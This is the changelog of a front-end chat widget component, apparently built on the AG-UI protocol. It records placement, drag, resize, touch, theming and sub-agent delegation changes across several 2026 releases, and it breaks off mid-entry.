# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Up and Down walk back through what you have already sent**, from an empty
  composer with the skills palette closed. The shape every shell and every
  coding agent uses; the conditions are what make it safe, because an arrow
  inside text is how you move the caret. Arrowing forward past the newest turn
  empties the box again, so the way out is the key that got you in, and typing
  hands the composer back so the next walk starts from the newest turn.

- **On a full page, the conversation list docks beside the transcript instead of
  covering it.** From 900px of panel width under `placement="page"`: no
  backdrop, no focus trap, and `role="region"` rather than a modal dialog, with
  the transcript shifted over rather than hidden. Covering the conversation to
  show the list of conversations hides the thing you are trying to get back to,
  and a dedicated route is the one surface with width to spare.

  Narrower than that, or under any other placement, it stays the slide-over it
  was -- a few hundred pixels of panel with a list docked into it leaves a column
  of transcript narrower than the messages in it. Width alone is not the test:
  an app shell can hand `embedded` a page-sized box, and that box is still a
  column of somebody's layout.

  `--ag-ui-threads-rail-width` sets the docked width; the host carries
  `data-threads-docked` while it is showing. `closeThreads()` joins
  `openThreads()`.

- **The agent can move the panel it is speaking from.** Four tools behind a new
  `chat` token on `data-page-actions`: `read_chat_surface`, `move_chat`,
  `minimise_chat` and `restore_chat`, plus the `describeSurface()` and
  `moveTo(corner)` methods behind them.

  This is the affordance nobody else can offer. Every other assistant's chat is
  a surface of its own, so it has nothing to be in the way *of*; this one is
  mounted in the page the user is working in.

  **They report what happened, not what was asked.** A panel that fills the
  screen has nowhere to move to, and a placement that places itself owns its
  position, so `move_chat` answers `moved: false` with the reason and what would
  work instead. `read_chat_surface` lets the agent ask before it acts rather
  than learn through a failure. `moveTo` claims the axes the same way a user
  drag does -- the launcher travels with the panel, the corner it opens from is
  re-picked, and switching placement hands everything back.

  None is stamped `x-destructive`: moving a window destroys nothing, and a
  confirmation card in front of it would be worse than the move. **What it gets
  instead is a notice and an undo.** A panel that rearranges itself
  mid-conversation has to be both visible and reversible, so `move_chat` and
  `minimise_chat` write a run notice with an Undo beside it that puts the panel
  back exactly where it was -- inset, launcher inset and the corner it opens
  from, which are one decision rather than three. A host calling `moveTo` or
  `setCollapsed` itself gets no notice: it is arranging its own page and does
  not need telling what it just did.

  Run notices may now carry that one control, and only ever an undo. Anything
  the user has to *decide* is a confirmation card; a notice reports something
  already done.

- **`showHighlightOverlay(el, options)`** -- ring a host-page element from an
  overlay drawn *outside* it, optionally dimming everything else (`scrim`) or
  flowing a gradient round it (`gradient`). Returns a function that removes it.
  `flash` and `focusWithFlash` accept both and route through it when either is
  asked for; the plain outline is unchanged and still the default.

  These are one mechanism rather than two features, and the reason is the same
  in both directions. The flat ring is an `outline` on the element deliberately,
  because a `box-shadow` is clipped away by any `overflow: hidden` ancestor
  sharing the target's box while the helper still reports success -- but an
  outline takes a *colour*, there is no `outline-image`, and anything else that
  can carry a gradient is a property of the target and lands back inside
  whatever is clipping it. Dimming everything else needs a surface larger than
  the target, which is the same problem from the other side.

  **It is inert.** The overlay takes no pointer event at the cut-out or anywhere
  else: a dim that swallows clicks is a modal the user did not open, and
  `highlightThenClick` has to reach the control it just pointed at. It follows
  the target on scroll and resize, and under reduced motion the gradient is
  still drawn but stops travelling. Themed with `--ag-ui-highlight-scrim` and
  `--ag-ui-highlight-gradient`.

- **Touch affordances, decided by the pointer rather than the width.** The eight
  resize grips are hidden -- a 6px edge strip is not a control, it is a trap that
  eats a scroll -- and the action, tool and send buttons go to 44px, which is
  what iOS and Android ask for and what 28-30px missed.

  The composer states at least 16px. iOS Safari zooms the page when a control
  under that takes focus, which drags the whole fixed panel with it and leaves
  the user pinching back out of a chat they only wanted to type into; the
  composer inherits the widget font, which is 14px by default and 13px at
  compact density.

  Every scroll container also contains its own overscroll, so reaching the end
  of the transcript no longer scrolls the page behind it.

- **`data-small-viewport="off"`** keeps the desktop layout at every width. Every
  value the small-viewport override sets is a token a host can re-state; the
  trigger is a media query, which cannot read one -- so without this the
  breakpoint was the only part of the placement model a consumer could not reach.

- **A small-viewport layout.** At 600px wide and below, every placement but
  `embedded` becomes one full-bleed shape: edge to edge, no radius, no shadow,
  no resize grips. There was previously no width-based behaviour of any kind, so
  a phone got the desktop's 380x560 floating panel clamped against the screen
  edges -- and that clamp had already produced one shipped defect, because any
  viewport under 428px was born against it.

  A phone is not an eighth placement, it is an override that collapses the
  others onto one of them. `embedded` is exempt: it sits in a box the host sized
  and placed, and only the host knows whether that column should become the
  whole screen. The corner placements still rest at their launcher, so a
  full-bleed panel is something the user opens rather than something they are
  given.

  The breakpoint is a width rather than a pointer test. A touch laptop is
  coarse-pointered and wide; a narrow desktop window is fine-pointered and
  small.

- **Tell the widget which edges of the viewport your own chrome already
  occupies**, with `--ag-ui-viewport-inset-top` / `-right` / `-bottom` / `-left`.
  A fixed placement covers the viewport it is given and knows nothing about your
  sticky header, so it came down on top of it.

  Reserving that space was already possible and was the wrong shape of work:
  `--ag-ui-inset` is one four-value shorthand and every placement has a different
  default, so a host restated it per placement family and then kept
  `--ag-ui-height` and `--ag-ui-max-height` in step by hand. Forgetting the
  height half overflowed the panel off the bottom of the screen with nothing to
  say so. Now `page` and `full` inset by all four edges, `sidebar` and `side` by
  three, `floating` and `bottom-left` add them to their own margins, and every
  height follows centrally.

  They take `env(safe-area-inset-*)` verbatim. `--ag-ui-viewport-height` and
  `--ag-ui-viewport-width` state the usable box outright for the case no
  viewport-percentage length describes -- an on-screen keyboard changes neither
  `vh` nor `dvh` nor `svh`, so a full-bleed panel on a phone has to be told.

  The playground's own config bar was the first consumer: it replaced
  twenty-five lines with one declaration.

### Changed

- **Four documented placements instead of seven.** `floating`, `sidebar`, `page`
  and `embedded` are the four shapes that differ structurally: a corner panel, a
  docked rail, a surface that owns the screen, and a thing in your layout.

  `bottom-left`, `side` and `full` **still parse and still work**, and are no
  longer documented. Each turned out to be a variant of one of the four rather
  than a shape of its own: `full` is `page` with `--ag-ui-content-max-width:
  none`, `bottom-left` is `floating` with a different `--ag-ui-inset`, and `side`
  is `sidebar` collapsing to the floating launcher instead of an edge rail.
  Nothing warns and no markup breaks -- `placement` is a public attribute in
  hand-written HTML with no build step to catch a removed value, so removing one
  would fail silently and visually. There is simply less to choose between.

- **The corner placements now rest at their launcher on a first visit.** An
  unconfigured widget mounted open, so a visitor's first page load put a 380x560
  panel over the host page's own bottom-right corner, uninvited. Every corner
  chat in the field rests closed and treats opening as something the user does.

  A stored choice still wins in both directions, so nobody who opened the panel
  finds it closed. Only `floating` and `bottom-left` are affected -- the
  placements that place themselves are unchanged, because a host that docks a
  sidebar or embeds the widget in its own layout has already decided it belongs
  on screen. `data-start-open` restores the previous behaviour.

  **This is a visible change for any host that mounts the widget without a
  placement**, which is the default, and it is the reason for the attribute.

- **Where the widget sits, how big it is and which theme it wears now outlive
  the tab.** These went to `sessionStorage` beside the transcript and inherited
  its lifetime without earning it: the transcript is per-tab on purpose -- two
  tabs are two conversations -- while a user who dragged the panel clear of
  their own interface did it again in the next tab, and again after every
  restart.

  They are written to `localStorage` and to the per-tab store, and read from the
  durable one first. The second write is not redundancy: a privacy mode can deny
  `localStorage` while allowing `sessionStorage`, and losing the durable copy
  should degrade to the previous behaviour rather than to no persistence at all.
  An existing per-tab value is still honoured, so nothing resets on upgrade.

  **Whether the widget is currently open stays per-tab.** That is a statement
  about this tab rather than a preference, and carrying it across would pop the
  panel open in every new tab because it was opened once somewhere else.

- **The page placement no longer collapses.** It is a dedicated route rather
  than a panel on someone else's page, so there was no "away" for it to go to:
  collapsing left a strip of application chrome fixed over a route that no
  longer had an owner, under the one placement that also hides the launcher.

  Removing the control was not enough on its own. The state has three other
  ways in -- the `collapsed` property, the attribute, and a value restored from
  per-tab storage that was written under a different placement -- and the
  storage key is namespaced per instance, not per placement. A tab that
  collapsed a floating panel and later loaded the same instance as a page would
  have restored a state with no control and no launcher to undo it. So the
  property and the restore are gated, switching into the placement releases a
  collapsed panel, and the stylesheet neutralises the state for the one path
  that reaches none of those: an attribute written straight onto the element.

  A control removed from the interface is not a state removed from the model.

  The embedded placement is unchanged and still collapses to its header bar,
  which is an ordinary accordion for a panel that sits in a page's own flow.

### Fixed

- **Dragging the panel or the launcher jumped, and stopped short of every
  edge.** Reported from a phone and reproduced on a desktop: the widget
  followed the pointer until it passed roughly the middle of the screen, then
  leapt by about the height of the host's own header bar -- and it could not be
  dragged flush to any side.

  Three separate causes, all of them in this release's own new work:

  A CSS `inset` on a fixed element is measured from the **real** viewport
  edges, and the new `--ag-ui-viewport-inset-*` support had them measured from
  the box the host left free. Halfway across the screen is where the expand
  corner flips -- the same point stops being written as a `top` and starts
  being written as a `bottom` -- so that is where the difference appeared, as a
  leap of exactly the reserved edge.

  The 24px gutter a placement rests a panel at was being enforced against a
  drag, which is what made it feel stuck short of every side. Staying on screen
  is the part that matters, and that is still enforced.

  Releasing the drag moved the launcher again, because the commit recomputed
  the same sum the last move had already applied. Both now come from one
  place, so the release changes nothing by construction.

  Also fixed while in there: a `pointercancel` now ends a drag. On touch that
  is routine rather than exceptional -- the browser takes the pointer back for
  a scroll or a system gesture and never sends `pointerup` -- and without it the
  move listeners stayed attached and the widget kept following a finger that
  had stopped.

- **The highlight overlay could not be themed by any host that themes the
  widget.** It is appended to the document body so it can escape the clipping it
  exists to avoid, so a `var()` in its own inline style resolved against the
  *body's* cascade -- a host setting `--ag-ui-accent` or
  `--ag-ui-highlight-scrim` on `ag-ui-chat` or a wrapper, which is how everything
  else here is themed, never reached it. Every token is now read from the
  element being pointed at, which is where the flat ring has always read its
  accent.

  Its inline styles also beat any rule a host could write, and `::part` does not
  reach the light DOM, so this was the one surface with no way in at all. The
  ring width, the gradient's speed and the stacking order are now tokens too
  (`--ag-ui-highlight-ring-width`, `--ag-ui-highlight-flow-ms`,
  `--ag-ui-highlight-z-index`), with `ringWidth` and `flowMs` options over them.

- **A panel could be dragged somewhere it could not be rescued from.** The
  clamps that keep it on screen measured a viewport starting at the top-left of
  the display, so a panel dragged upward settled happily underneath a host's
  sticky header -- and collapsing it, the one thing a user tries, replaced an
  unreachable panel with an unreachable launcher. They now clamp against the
  box the host actually left, reserved edges included.

- **The sidebar's edge rail ran under reserved chrome, and looked like a
  stripe.** It asked for `100vh` and pinned its own bottom, so it ignored those
  same reserved edges -- and the icon lives at the top of the rail, which made
  the one control that reopens the panel the first thing to disappear behind a
  header.

  It has also been redesigned. A screen-high slab of accent carrying one small
  icon is the widest collapsed state the widget has and the one that said least
  about itself; it now reads as the docked edge of a panel -- the surface the
  panel is made of, a border on the side it docks against, the accent kept for
  the icon, and the widget's own title set down the rail as a caption
  (`rail-label` part).

- **A panel no longer sizes itself to screen space the on-screen keyboard is
  covering.** No CSS length describes this: a keyboard has no effect on any
  viewport-percentage unit, so `100vh`, `100dvh` and `100svh` are the same
  number with it up as without. A full-bleed panel sized from one of them put
  its own composer behind the keyboard being typed into.

  The element now tracks `visualViewport` and publishes both the visible height
  and how much is hidden below it. The height shrinks the panel; the hidden gap
  lifts anything anchored to the bottom, which a shorter panel does not do on
  its own -- a floating widget is positioned against the layout viewport, so its
  bottom edge and the launcher at that corner stayed behind the keyboard
  whatever height it had. A host's own `--ag-ui-viewport-height` still outranks
  the measurement, and nothing is written at all while the two viewports agree.

  The same measurement fixes the clamps, which were computing which corner to
  open into using space that was off the screen.

- **The chat-history list could not be dismissed under the embedded
  placement.** The drawer closes when its backdrop is clicked, which is enough
  wherever a strip of backdrop is showing -- but `embedded` widens the panel to
  the full width of the host's box on purpose, so there was none left to hit.
  What remained was Escape, which is invisible, picking a row, and New chat,
  which replaces the conversation you opened the list to get back to.

  The drawer header now carries a close control, exposed as the `drawer-close`
  part. It is a third control in a row built for two, so it was measured at the
  narrow end: at a 220px panel nothing overflows and every control stays inside
  it. The title takes the slack and truncates rather than pushing them out.

- **The documented way to make a sidebar push content instead of overlaying it
  did not work.** Setting `--ag-ui-position: static` and placing the element in
  your own layout is what the README offers, and it put the panel at the
  document origin rather than in the box you gave it -- measured 1631px above
  its own host on a scrolled page, and pinned to the document's left edge rather
  than the host's when docked left.

  The panel is taken out of flow so the collapse can slide it out at full width,
  which needs the host to be a containing block. The host was one only by
  accident, because it is `position: fixed` by default; a static element
  establishes nothing, so the panel resolved against the initial containing
  block instead. The sidebar host now contains its own layout whatever its
  position, which is a no-op in the default overlay case.

  It looked correct wherever it was first tried: a full-height column at the top
  of an unscrolled document is exactly where the two answers coincide. The
  stylesheet's own tests could not see it either -- they match strings against
  the source, and every declaration involved was already correct on its own. The
  regression test measures rects in a real browser, with the host offset from
  the viewport and the page scrolled.

## [0.34.0] — 2026-09-03

### Added

- **The open panel moves by its header**, the way a window moves by its title
  bar. The collapsed launcher has been draggable since 0.33.0 and the panel was
  not, so a chat sitting over the thing it was being asked about could only be
  moved by collapsing it first.

  It is one widget being moved, not two things being placed: **the launcher
  travels the same distance the panel does**, so a panel dragged 100px left
  leaves the bubble it collapses into 100px left of where it was. The distance
  is the panel's own rather than the pointer's -- a panel held against the
  viewport's margin stops, and the bubble stops with it -- and the bubble is
  then held on screen in its own right.

  A stated position is also kept rather than re-derived, which is the whole
  difference between the two drags. A launcher drag says where the bubble goes
  and leaves the panel to open into whatever room the viewport has, re-decided
  on every expand and every window resize; a header drag states the panel's own
  position, so it survives collapsing, reopening and reloading, and dragging the
  bubble again hands the decision back. Which corner the panel is pinned by is
  re-picked when the drag ends, from where the bubble ended up, so the next
  expand still opens into clear space -- and re-picking it moves nothing, since
  both insets are written from positions that are already decided. Stored per
  tab like the launcher's own position, and off under
  `data-launcher-drag="false"` along with the launcher drag.

  A press that starts on a control in the header stays that control's, including
  one a host slotted in. There is no keyboard shortcut on the header on purpose:
  a header is not a control, and making it focusable would put a tab stop with
  no role ahead of the controls a keyboard user came for, while arrow keys on
  the collapsed launcher already move the widget, panel included.

### Fixed

- **A chart no longer grows with the panel.** Widening the panel used to resize
  what was already in it: the renderer drew into a fixed 480x220 viewBox, the
  block stretched to the transcript's full width, and `width: 100%` scaled the
  drawing to fit it. In a 1100px panel the axis labels came out **3.25x** the
  size they are at the default width and the chart stood **489px** tall, pushing
  the answer it belonged to off the screen.

  Two separate things were wrong, and both are fixed:

  - **It was magnified rather than sized.** Geometry is now computed for the
    width the block actually has, one SVG unit per CSS pixel, and recomputed
    when that width changes -- so a 10px axis label is 10px at every size,
    including the narrow end, where the old drawing was shrunk to 7px in the
    default 380px panel. Height follows width inside a 160-320px band, and the
    480px width draws exactly the frame it always did. Where the labels no
    longer fit, every second or third is drawn rather than a smear of
    overlapping words -- a new answer to a collision that was there at every
    size before. Below 220px the drawing scales down as it used to, since at
    that width nothing fits either way.
  - **It was stretched rather than sized too.** The block now takes the width it
    needs and stops, capping at the new `--ag-ui-chart-max-width` (**480px**),
    the way a message bubble caps rather than filling the panel. Raise the token
    for a bigger chart and the labels stay 10px: the cap decides how much room
    the drawing gets, never how big its type is.

## [0.33.1] — 2026-09-03

### Fixed

- **A markdown table in an answer scrolled, at last.** The stylesheet has always
  said a wide table should scroll inside its own box, and it never could:
  `.message` set `word-break: break-word`, which is the legacy spelling of
  "break anywhere", and breaking anywhere drops the **min-content width** of
  every descendant to a single character. A table's column algorithm takes
  min-content as an input, so the table always fitted `max-width: 100%`, the
  `overflow-x: auto` beneath it never had anything to scroll, and the columns
  absorbed the pressure by rendering one letter per line instead. A seven-column
  header row came out **162px tall**.

  It is now `overflow-wrap: break-word`, which breaks a word only when it would
  otherwise overflow its line and leaves min-content alone. Same protection
  against a long unbroken token blowing out a bubble -- which is all the
  declaration was ever for -- and the table is free to be wider than the panel
  and scroll. Measured at the default 380px panel: the header row drops from
  162px to 50px, the table from 524px to 189px, the narrowest column from 36px
  to 63px, and `scrollWidth` finally exceeds `clientWidth` (563 against 266).

  Reported against 0.32.0 and present at least as far back as 0.27.0, so this is
  not a recent regression. Thanks to the TrustPoint team for the measurements
  and the revert control, which is what pinned the cause to one declaration.

  The three other `word-break: break-word` declarations are untouched: they are
  on `.thoughts-body`, `.tool-call-result` and `.confirm-args`, all of which are
  filled with `textContent` and so cannot contain a table.


## [0.33.0] — 2026-09-02

### Added

- **The panel resizes from every edge and every corner**, not only one grip.
  The model is that the edge a grip does not drag is the one that stays put, so
  a grip names its own edge and no layout can invert it.

  A drag on the edge the layout was *holding still* moves the panel as well as
  resizing it -- a floating panel pinned bottom-right could not grow rightward,
  because its right edge is what the placement fixed. Those grips take the
  position over by writing `--ag-ui-inset`; a grip on a free edge still writes
  nothing but the size, so a host positioning the panel with its own rule keeps
  it until someone drags the edge it was holding.

  Exactly one grip stays in the tab order -- the corner opposite the pinned one,
  so an arrow key changes the size and never the position. Eight separators
  between the transcript and the composer would be a keyboard obstacle rather
  than keyboard parity, and one grip already reaches both axes. Every grip has
  its own part, and the hit areas are sized by `--ag-ui-grip-corner` and
  `--ag-ui-grip-edge`.

  Each grip draws a short pill centred on its edge -- a dot in a corner --
  shown on hover and focus as well as during a drag, since a mark that appears
  only once you are already dragging never told anyone the grips were there.
  Filling the whole handle was what the single corner grip did, and at 14px
  square nobody saw it; on a strip running the length of an edge the same fill
  is a square-ended bar stopping short of the corner radius, which reads as a
  border the panel grew. It was reported as one. The mark is sized by
  `--ag-ui-grip-mark-length` and `--ag-ui-grip-mark-thickness`.

- **Files can be pasted into the composer**, alongside the picker and a drop --
  a screenshot straight from the clipboard, or a file copied in the file
  manager. Text pastes carry no files, so ordinary pasting is untouched, and the
  default is prevented only when the clipboard carries no text: copying a rich
  selection containing an image puts both on the clipboard, and swallowing the
  words someone meant to paste is the worse of the two failures.

- **The collapsed launcher can be dragged anywhere on screen, and the panel
  opens into the clearest space around it.** Per axis, the element compares the
  room a panel would have on either side of the launcher and pins the side with
  more of it, so a launcher dropped top-left opens down and to the right. What
  it compares is the room the *panel* would get rather than which half of the
  screen the launcher is in; those disagree either side of centre, and only the
  first is about whether the panel fits.

  Where the panel fits on neither side -- the middle of a short viewport -- the
  launcher still keeps its position: the panel is clamped into the viewport and
  the launcher's own inset carries the difference, which is why it can end up
  outside its own host box. Nothing clips it there, and it keeps its pointer
  events.

  The position persists per tab beside the collapsed, theme and size
  preferences, arrow keys move it from the keyboard, and
  `data-launcher-drag="false"` opts out -- as does any placement that already
  places the launcher itself. An undragged launcher is untouched: with nothing
  stored the element writes no position at all, and feeding the geometry the
  resting corner reproduces the existing default unchanged.

  Two things worth carrying. A drag ends in a `click` the browser synthesises,
  which would expand the panel the user was only moving -- but suppressing it
  by arming a flag also swallows `Enter` on the focused button, assistive
  activation, and a host's own `click()`, none of which can be the tail of a
  drag and all of which are the only way in without a pointer. The suppression
  is therefore narrowed to clicks carrying a click count. And the launcher is
  scaled in four separate states, so `getBoundingClientRect` reports a box a few
  pixels off in every one of them; the size comes from `offsetWidth` and the
  position from the rect's centre, which a centred scale cannot move.

- **Copy puts the message on the clipboard in both flavours**, so a table
  pastes as a table. `text/html` carries the markup for a target that reads it;
  the plain flavour is serialised structurally -- tab separated table rows,
  which is what a spreadsheet splits on, and list items that keep their markers.

  It was `textContent`, which is the obvious source and loses every piece of
  structure the message had: descendants concatenated with no separator, so a
  table arrived as one run of cells with the headers welded to the first row.

  A host driving its own bar opts in by passing the new `html` alongside `text`;
  with `text` alone the clipboard gets plain text only, as before.

- **What is drawn on the accent and danger fills is now a variable**
  (`--ag-ui-on-accent`, `--ag-ui-on-danger`). Eight rules had white hardcoded
  against those two fills, so theming the accent to anything pale produced
  white-on-pale on the send button, both approval buttons, the confirmation
  card and the checkpoint row, with no way to correct it.

- **The disclosure marks are variables too** (`--ag-ui-disclosure-collapsed`,
  `--ag-ui-disclosure-expanded`). The tool-status marks already were, so a host
  re-theming the marks changed half of them and ended up with two vocabularies
  in one transcript.

### Fixed

- **The anchor probe inverted at the size clamps.** The element learns which
  edges its layout holds still by changing its own size by a pixel and seeing
  what moved, and it grew. Growing cannot answer the question at a size already
  resting against `max-width` or `max-height`: the box does not change, no edge
  moves, and every clamped axis reported the edge that did *not* move -- which
  is the free one. The grip landed on the corner the drag travels by, with the
  direction inverted.

  It needed no unusual setup to reach. The default panel is 380px wide against
  a max-width of `100vw - 48px`, so **any viewport under 428px was born
  clamped**. The probe now shrinks, which always moves an edge because it is
  measured from the box's used width rather than from whatever was asked for,
  and falls back to growing for an axis a host rule gives a minimum.

- **A pasted blob with no filename** reached the upload as an empty `filename`
  and showed in the tray as a chip with no label. It is given a name.

- **A sub-agent failure whose message the server left empty settled the row to
  a blank line**, reading as a delegation that said nothing rather than one
  that failed. The fallback for it existed in the string table, documented as
  covering exactly this, and was wired to nothing.

- **Copying an answer that contained a code block copied the word Copy with
  it.** The code blocks' copy buttons are appended *inside* their own `pre`, so
  they are descendants of the message, and reading `textContent` picked their
  label up mid-sentence. Both clipboard flavours now come from a copy of the
  message with the component's own buttons removed.

- **The message action controls were about 20px square**, under the 24px that
  makes a control reliably tappable, and marked with text glyphs -- the copy
  mark in particular has no font behind it on most systems, so it rendered as
  a mark nobody could name on a target nobody could hit. They are now sized
  from `--ag-ui-action-size` with a 24px floor and drawn with the same icon set
  as the rest of the component.

- **An icon-only action was unnamed for anyone using a keyboard.** The label was
  carried by `title`, which browsers never show on focus. Each control now draws
  its own label on hover and on focus alike, and the icon holder has its own
  part so a host can swap the mark.

### Changed

- **The resize grip is placed from the corner the element chose, when it chose
  one.** With a dragged position the pinned edges are known rather than probed,
  so `#measureAnchor` is skipped. The probe nudges the size by a pixel and reads
  which edges moved, which cannot work at a size already resting against
  `max-width` or `max-height` -- every clamped axis reads as pinned on the wrong
  side. That is a pre-existing defect on the measured path and is untouched here.

- **The demo's delegation scenario now streams the carrier a current server
  writes.** It still emitted the five-phase `ag_ui.subagent` `CUSTOM` lifecycle
  that 0.32.0 moved onto the protocol's `SUBAGENT_STARTED` / `_FINISHED` /
  `_ERROR` — so the playground demonstrated only the shape kept for
  back-compatibility, and the component's own showcase was the one place the new
  wire could not be seen.

  Found by driving the demo in a browser rather than by reading it. Worth noting
  that the *rendering was identical either way*, which is the tolerance working
  as intended and also the reason a passing look at the page proves nothing about
  which wire produced it: the check that separates them is reading the stream.

  The legacy shape stays accepted — `subAgentUpdate` still narrows all five
  phases for a server one release behind, covered by
  `tests/subagent_update.test.ts`. It is a tolerance, not something a showcase
  should teach.

## [0.32.0] — 2026-08-31

### Added

- **The delegation panel reads the protocol's own sub-agent events.**
  `SUBAGENT_STARTED` / `SUBAGENT_FINISHED` / `SUBAGENT_ERROR` now open and settle
  the panel; `AgUiClientHandlers` grows `onSubAgentStarted` /
  `onSubAgentFinished` / `onSubAgentError` for a host that wants them directly.
  A delegation is still keyed to the card that spawned it — the opening event's
  `parentToolCallId` is the same value the `ag_ui.subagent` steps carry as
  `delegationId`, and the pairing to `subagentRunId` is recorded there because
  the two closing events carry the run id and nothing else.

  The lifecycle wording moved client-side with it. The protocol's events carry a
  name and no rendered status, which is the better shape for a localised UI, so
  `UiStrings` gains `subAgentDelegatedTo`, `subAgentFinished` and
  `subAgentFailed`. The two step phases still render the server's own `status`.

### Changed

- **`ag_ui.subagent` is now the steps channel only.** A current `django-ag-ui`
  sends `tool_call` and `tool_result` on it and nothing else. The narrower still
  accepts the three lifecycle phases, deliberately: a server one release older
  sends all five, and this element is published and vendored separately from it,
  so the older shape degrades rather than showing a delegation that never opens.

- **Floored at `@ag-ui/core` and `@ag-ui/client` `>=0.0.59`**, raised from
  `>=0.0.54`. 0.0.59 is the release that added the three events. The range stays
  open at the top (`<0.1`) — a caret on a `0.0.x` would pin the patch and turn
  the weekly unpinned-resolve job into a no-op.

  The canonical AG-UI event set asserted by `tests/ag_ui_event_contract.test.ts`
  moves from 33 to 36 in step, as does its twin in `django-ag-ui`'s suite.

## [0.31.1] — 2026-08-31

### Fixed

- **A collapsed widget did not give its space back inside a flex or grid parent.**
  The panel hid and the box it occupied stayed: a header bar over several hundred
  pixels of nothing.

  Every collapse path works by letting the host size to its content -- the
  in-flow placements set `height: auto` and keep the header bar, the floating one
  leaves only the launcher. A parent whose `align-items` is the default stretch
  overrides all of it, and putting the element in a flex row beside the page
  content is the obvious way to embed it. `align-self: start` on the collapsed
  host is the whole fix.

  Reported from a running page rather than found here, and it was reaching every
  known consumer: four frontends with byte-identical `display: flex` containers.

  Scope worth stating, since it reads as narrow. `page` sizes itself to the
  viewport, so a parent never stretches it. `floating` -- the default -- is
  documented as never reflowing the page and hides its panel with `visibility` so
  the transition has something to animate; a visibility-hidden box still occupies
  its space, so a floating widget cannot shrink an in-flow parent and is not
  meant to be in one. A host docking a full-height panel wants a placement rather
  than the floating default.


## [0.31.0] — 2026-08-30

### Changed

- **The rating pair is off unless a host asks for it.** `data-message-actions`
  now defaults to `copy,retry`; thumbs need
  `data-message-actions="copy,retry,feedback"`.

  Copy and retry work with nothing wired -- copy reads the DOM, retry drives this
  element. The rating pair does not: it fires `ag-ui-feedback` and stores nothing
  by design, because a rating belongs to whatever the host already uses for
  product signal. With no listener the buttons still latch `aria-pressed`, which
  is deliberate -- a rating is a standing statement about a message -- so a
  reader is told their rating was taken, a screen reader announces it as pressed,
  and nothing recorded anything.

  This README has said since the row shipped that two buttons leading nowhere are
  worse than none. Defaulting them on was that sentence being false. Neither
  known consumer of this component listens for the event, so both were shipping
  exactly the buttons the sentence warns about.

  The row shipped two days ago in 0.29.0, so the population relying on the old
  default is close to nobody, and a host that does listen restores them with one
  attribute.


## [0.30.0] — 2026-08-30

### Added

- **The sub-agent fixture was re-copied after the server added a `timestamp` to
  every `CUSTOM` event.** Reading the wire rather than the prose is what found
  that gap: `CUSTOM` was the only event type in the stream without one. The
  client needed no change to absorb it — the field is additive and ignored here —
  which is the degradation story working, and the copy is byte-identical to the
  producer's again.

- **A delegated sub-agent's progress, on the card that delegated it.** A run that
  hands work to a sub-agent read as a stall: the parent's `delegate_task` card
  sat at "running..." for the child's entire duration, however many tools the
  child called, with nothing on screen. The component now consumes the AG-UI
  `CUSTOM` event named `ag_ui.subagent` and draws it — the first real consumer of
  the `onCustomEvent` carrier opened in 0.29.0.

  **It attaches rather than floats, because the wire lets it.** `delegationId` is
  the *parent's own* `delegate_task` tool-call id, not the child's run id, so the
  thing being narrated is a card this component already drew on
  `TOOL_CALL_START`. The surface is one collapsed row inside that card, carrying
  the server's pre-rendered `status` line and nothing else, expanding onto the
  child agent's own tool calls. A ten-step child costs one row until somebody
  opens it, and there is no second visual language to learn.

  Two alternatives were considered and dropped. A bare status line is cheaper and
  gives up the detail entirely. Inline child cards in the main transcript
  interleave parent and child with nothing marking whose is whose — and in an
  order the persisted transcript, which never held the progress, cannot
  reproduce.

  **A failure carries no exception text on this channel, and none is invented
  here.** That is the same reasoning that redacts a `RUN_ERROR`: an exception's
  words are written for an operator. The detail rides the ordinary
  `TOOL_CALL_RESULT` for that delegation and lands in the same card's result
  region, a few pixels below the row that reported the failure.

  **Nothing is persisted or replayed.** A `CUSTOM` event never enters the message
  list, which is the correct half of the carrier split — a delegation that was
  live an hour ago is not live now. Reload mid-run and the tool card is still
  there while the nested detail is not; that is the intended behaviour rather
  than a gap. Like `ag_ui.invalidate`, the name is routed rather than forwarded,
  so it does not also arrive as an `ag-ui-custom` event; every other name still
  reaches the host untouched.

  A child's calls are keyed by the child's own `toolCallId`, so the `tool_call`
  that opens one and the `tool_result` that settles it are one row updated in
  place. The wire's tri-state `ok` is kept as one: absent while the call runs,
  and only then a mark, since flattening "in flight" into "failed" would draw
  every running call as a failure for as long as it ran. The row sits outside the
  card body so it survives every `data-tool-display` mode — a progress line
  visible only in `full` would leave the stall it exists to end.

  New parts: `tool-card-subagent` on the card's region, and `subagent`,
  `subagent-row`, `subagent-icon`, `subagent-status`, `subagent-steps`,
  `subagent-step`, `subagent-step-icon`, `subagent-step-name` inside it. New
  strings: `subAgentWorking`, `subAgentSteps`.

  Tested against a fixture generated by the server's own encoder rather than a
  hand-written double, replayed both through the subscriber and, in Chromium,
  through the real `HttpAgent` from Server-Sent Events — with the resulting boxes
  measured at sidebar and phone widths, since the row is a new control in a card
  that already existed.

- **`formatToolPayload` — a host hook for what a tool card's body says.** The
  card pretty-printed its two payloads as JSON and offered no way in, so a
  thirty-field result rendered as a wall of text where the host wanted a table
  or a sentence. `ClientTool.render` could not answer it: it is handed the
  *arguments* only, and a server-side tool has no `ClientTool` at all, which
  left the result region the one part of the transcript a host could not reach.
  The hook is asked about each region of each card and may return a `Node`, a
  `string`, or `null` to leave the built-in rendering alone.

  **Both halves, one hook, told apart by `kind`.** They take different code
  paths — arguments are rendered when the card is built, the result when it
  settles — so covering only the result would have left the other half needing a
  second hook later, and two hooks differing only in which region they draw is a
  worse surface than one that says which. They do not carry the same thing,
  which is why the payload is a discriminated union rather than a flat
  `(toolName, payload, kind)`: `arguments` hands over the parsed record the call
  was made with, `result` the raw string the tool returned plus the outcome it
  settled on. Flattening them would have forced every formatter to re-derive
  which it had, and re-serialised the arguments for nothing.

  **Scoped to presentation, deliberately.** The card and the model already read
  separate copies of a tool result — the model's is maintained by
  `@ag-ui/client` from the same event and persisted with the history, and the
  card has always shown that string reformatted — so a formatter changes what
  the person reads and nothing the agent reads. That is what makes restyling
  safe here, and equally why *rewording* was rejected: renaming a value belongs
  on the server, where it reaches the model's prose too, instead of leaving the
  card disagreeing with the answer beside it. A returned string is set as text
  and never parsed as markup, so this is not a second HTML channel into the
  transcript.

  A region a formatter drew is marked `data-formatted`, which relaxes the
  preformatted whitespace the JSON block relies on — a table would otherwise
  inherit it as mangled cell spacing. Whitespace only: the card's face, frame
  and scroll cap stay, because the card is one visual object and a payload sized
  for a wide page must still be contained by a sidebar. `ToolPayload`,
